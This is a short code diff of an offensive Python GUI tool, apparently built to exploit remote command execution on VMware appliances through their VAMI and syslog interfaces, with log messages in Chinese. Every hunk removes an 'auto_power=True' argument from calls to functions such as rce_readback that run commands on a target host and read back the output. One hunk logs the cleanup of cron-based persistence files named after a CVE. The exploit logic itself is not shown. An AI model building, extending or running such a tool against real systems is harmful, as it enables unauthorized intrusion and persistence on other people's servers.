@@ -823,7 +823,7 @@ class ToolApp:
                                     vami_port=vport, proxy=proxy,
                                     use_b64=self.v510_b64.get(),
                                     poll_cb=lambda s: self.log(s, "m"),
-                                    stop_flag=self.stop_flag, auto_power=True)
+                                    stop_flag=self.stop_flag)
             if ok:
                 self.log("[+] 命令输出已取回（%d 字节）" % len(text), "+")
 
@@ -943,7 +943,7 @@ class ToolApp:
                 ok, text = rce_readback(host, port, cmd, tag, tcp=tcp, tls=tls,
                                         vami_port=vport, proxy=proxy,
                                         poll_cb=lambda s: self.log(s, "m"),
-                                        stop_flag=self.stop_flag, auto_power=True)
+                                        stop_flag=self.stop_flag)
                 if not ok:
                     self.log("[!] %s：%s" % (name, text), "!")
                     return
@@ -1726,7 +1726,7 @@ class ToolApp:
             ok, text = rce_readback(host, port, cmd, tag, tcp=tcp, tls=tls,
                                     vami_port=vport, proxy=proxy,
                                     poll_cb=lambda s: self.log(s, "m"),
-                                    stop_flag=self.stop_flag, auto_power=True)
+                                    stop_flag=self.stop_flag)
             if not ok:
                 self.log("[!] %s" % text, "!")
                 return
@@ -1868,7 +1868,7 @@ class ToolApp:
                           syslog_port=port, proto=self.v510_proto.get().lower(),
                           vami_port=vport, proxy=proxy, inventory=inv,
                           log=lambda s: self.log(s, "m"),
-                          stop_flag=self.stop_flag, auto_power=True)
+                          stop_flag=self.stop_flag)
             self.chain_result = r
             card = r.card
 
@@ -2667,7 +2667,7 @@ class ToolApp:
             ok, text = rce_readback(host, port, cmd, tag, tcp=tcp, tls=tls,
                                     vami_port=vport, proxy=proxy,
                                     poll_cb=lambda s: self.log(s, "m"),
-                                    stop_flag=self.stop_flag, auto_power=True)
+                                    stop_flag=self.stop_flag)
             if ok:
                 self.log("[+] 目标残留已清除，/etc/cron.d/ 现状:\n%s" % text, "+")
                 self.record("清理-目标残留", host, "rm -rf /etc/cron.d/cve59310* 等",
